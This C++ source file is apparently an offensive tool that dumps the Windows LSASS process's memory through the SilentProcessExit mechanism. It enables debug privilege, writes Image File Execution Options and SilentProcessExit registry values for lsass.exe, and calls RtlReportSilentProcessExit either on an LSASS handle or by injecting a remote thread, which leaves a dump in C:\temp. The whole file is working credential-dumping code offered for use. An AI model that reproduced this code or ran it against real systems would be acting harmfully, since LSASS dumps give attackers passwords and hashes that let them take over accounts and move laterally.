#include <iostream>
#include "SilentProcessExitRegistrySetter.h"

#define USAGE "Usage: LsassSilentProcessExit.exe <LSASS_PID> <DUMP_MODE>\n\tDUMP_MODE:\n\t\t0 - Call RtlSilentProcessExit on LSASS process handle\n\t\t1 - Call CreateRemoteThread on RtlSilentProcessExit on LSASS\n"
#define DUMP_MODE_LSASS_HANDLE 0
#define DUMP_MODE_CREATE_REMOTE_THREAD 1

typedef NTSTATUS(NTAPI* RtlReportSilentProcessExit_func) (
	_In_     HANDLE                         ProcessHandle,
	_In_     NTSTATUS						ExitStatus
	);

BOOL EnableDebugPrivilege(BOOL bEnable)
{
	HANDLE hToken = nullptr;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE;

	TOKEN_PRIVILEGES tokenPriv;
	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;
	tokenPriv.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return FALSE;

	return TRUE;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		std::cout << USAGE;
		return -1;
	}

	int dumpMode = atoi(argv[2]);

	if (dumpMode != DUMP_MODE_LSASS_HANDLE && dumpMode != DUMP_MODE_CREATE_REMOTE_THREAD)
	{
		std::cout << USAGE;
		return -1;
	}

	std::cout << "Setting up debug privilege...\n";

	if (!EnableDebugPrivilege(TRUE))
	{
		std::cout << "ERROR: Failed to enable debug privilege!\n";
		return -1;
	}

    std::cout << "Setting up GFlags & SilentProcessExit settings in registry...\n";

	// This sets up the GlobalFlag value in the IFEO registry key and the SilentProcessExit registry values
	SilentProcessExitRegistrySetter speRegSetter("lsass.exe");

	// Make sure we've written all the relevant registry keys
	if (!speRegSetter.isValid())
	{
		std::cout << "ERROR: Could not set registry values!\n";
		return -1;
	}

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	RtlReportSilentProcessExit_func RtlReportSilentProcessExit = (RtlReportSilentProcessExit_func)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");

	int pid = atoi(argv[1]);

	DWORD desiredAccess;

	if (dumpMode == DUMP_MODE_LSASS_HANDLE)
		desiredAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
	else
		// CreateRemoteThread required privileges
		desiredAccess = PROCESS_ALL_ACCESS;

	HANDLE hProcess = OpenProcess(desiredAccess, FALSE, pid);

	if (hProcess == INVALID_HANDLE_VALUE)
	{
		int lastError = GetLastError();

		std::cout << "ERROR OpenProcess() failed with error: " << lastError << "\n";
		return -1;
	}

	// If true, run RtlReportSilentProcessExit() on the LSASS handle
	if (dumpMode == DUMP_MODE_LSASS_HANDLE)
	{
		NTSTATUS ntstatus = RtlReportSilentProcessExit(hProcess, 0);

		std::cout << "RtlReportSilentProcessExit() NTSTATUS: " << std::hex << ntstatus << "\n";

		return 0;
	}
	
	// Dump mode is CreateRemoteThread


	// While RtlReportSilentProcessExit accepts two parameters, 
	// the second parameter is the exit code which has no significant effect on the API.
	// The first parameter is set to -1 (0xFFFF) which is the pseudo-handle returned from GetCurrentProcess()
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RtlReportSilentProcessExit, (LPVOID)-1, NULL, NULL);

	if (!hThread)
	{
		int lastError = GetLastError();
		std::cout << "ERROR CreateRemoteThread() failed with error: " << lastError << "\n";
		return -1;
	}

	std::cout << "DONE! Check out the dump folder (C:\\temp)" << "\n";

	return 0;
}
